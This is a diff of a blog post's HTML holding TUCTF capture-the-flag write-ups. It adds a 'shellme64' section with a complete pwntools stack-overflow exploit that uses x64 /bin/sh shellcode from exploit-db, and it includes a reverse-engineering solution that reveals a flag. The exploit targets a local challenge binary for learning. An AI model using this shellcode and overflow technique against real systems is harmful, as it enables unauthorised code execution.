@@ -573,7 +573,7 @@
       <p>I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.</p>
 <hr>
 <h1 id="pwn-challenges">Pwn Challenges</h1>
-<h2 id="thefirst--379-pts">thefirst - 379 pts</h2>
+<h2 id="thefirst---379-pts">thefirst - 379 pts</h2>
 <p>We can see in the image below that <code>gets</code> is being used to take the input. Hence it can be exploited for <em>buffer overflow</em>. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.</p>
 
 
@@ -673,7 +673,7 @@ p<span style="color:#f92672">.</span>sendline(payload)
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><hr>
-<h2 id="shellme32--462-pts">shellme32 - 462 pts</h2>
+<h2 id="shellme32---462-pts">shellme32 - 462 pts</h2>
 <p>On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using <code>vmmap</code>, we find that the adress given to us is that of the stack and the stack is read, write and executable.</p>
 
 
@@ -728,7 +728,40 @@ p<span style="color:#f92672">.</span>sendline(payload)
 
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><hr>
-<h2 id="printfun--500-pts">printfun - 500 pts</h2>
+<h2 id="shellme64---480-pts">shellme64 - 480 pts</h2>
+<p>This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace <code>p32</code> with <code>p64</code> when adding the stack address to the payload.</p>
+<p>We use <a href="https://www.exploit-db.com/exploits/42179">exploit-db</a> to get the shellcode. The offset of the crash is same as before.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xd2</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xf6</span><span style="color:#ae81ff">\x48</span><span style="color:#ae81ff">\xbb</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x62</span><span style="color:#ae81ff">\x69</span><span style="color:#ae81ff">\x6e</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x73</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x53</span><span style="color:#ae81ff">\x54</span><span style="color:#ae81ff">\x5f</span><span style="color:#ae81ff">\xb0</span><span style="color:#ae81ff">\x3b</span><span style="color:#ae81ff">\x0f</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">&#34;</span>
+len_shell_code <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./shellme64</span><span style="color:#e6db74">&#34;</span>)
+
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">this</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Stack Address: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> str(hex(addr)))
+
+payload <span style="color:#f92672">=</span> shellcode
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(offset <span style="color:#f92672">-</span> len(shellcode))
+
+<span style="color:#75715e"># with open(&#39;payload&#39;, &#39;wb&#39;) as f:</span>
+<span style="color:#75715e">#     f.write(payload)</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(addr)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(payload)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><hr>
+<h2 id="printfun---500-pts">printfun - 500 pts</h2>
 <p>Here, on analysing with Ghidra, we find that there is a format string vulnerability.</p>
 
 
@@ -793,7 +826,7 @@ p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"><
 p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><hr>
 <h1 id="rev-challenges">Rev Challenges</h1>
-<h2 id="faker--400-pts">faker - 400 pts</h2>
+<h2 id="faker---400-pts">faker - 400 pts</h2>
 <p>If we open the binary in Ghidra, we see that there are calls to different functions, namely <em>A</em>, <em>B</em> and <em>C</em>, which depend on the user input. But on trying them, we get fake flags.</p>
 
 
@@ -867,7 +900,7 @@ p<span style="color:#f92672">.</span>interactive()
 </figure>
 
 <p>There can be two ways to solve this challenge.</p>
-<h3 id="method-1--static">Method 1 - Static</h3>
+<h3 id="method-1---static">Method 1 - Static</h3>
 <p>Write a script to emulate the functionality of the <code>printFlag</code> function.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printFlag</span>(s):
     s2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
@@ -878,14 +911,14 @@ p<span style="color:#f92672">.</span>interactive()
 
 printFlag(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">PJ</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k</span><span style="color:#e6db74">&#34;</span>)
 </code></pre></div><p>This gives us the flag - <code>TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}</code></p>
-<h3 id="method-2--dynamic">Method 2 - Dynamic</h3>
+<h3 id="method-2---dynamic">Method 2 - Dynamic</h3>
 <p>Here set a breakpoint in main and then run the following commads in GDB.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions  <span style="color:#75715e"># get address of printFlag function</span>
 <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $rip<span style="color:#f92672">=</span>0x000055555555534b   <span style="color:#75715e"># i.e. to the address of the function</span>
 <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> c
 </code></pre></div><p>This will print the flag.</p>
 <hr>
-<h2 id="core--400-pts">core - 400 pts</h2>
+<h2 id="core---400-pts">core - 400 pts</h2>
 <p>We a re provided a core dump and a C file. The C file looks like this</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;  // prints</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt; // malloc</span><span style="color:#75715e">
@@ -1230,6 +1263,13 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><sp
 <div class="article-widget">
   
 <div class="post-nav">
+  
+  
+  
+  <div class="post-nav-item">
+    <div class="meta-nav">Next</div>
+    <a href="/post/2019-12-15_watevr-ctf-2019-writeups/" rel="next">watevrCTF 2019 Writeups (Mainly Rev and Pwn)</a>
+  </div>
   
   
   
